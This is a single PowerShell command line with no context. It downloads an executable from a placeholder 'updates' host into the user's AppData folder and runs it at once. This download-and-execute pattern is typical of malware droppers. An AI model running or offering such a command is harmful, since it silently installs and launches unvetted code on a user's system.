Invoke-RestMethod -Uri "https://updates.example.org/tool.exe" -OutFile "$env:APPDATA\tool.exe"; Invoke-Item "$env:APPDATA\tool.exe"
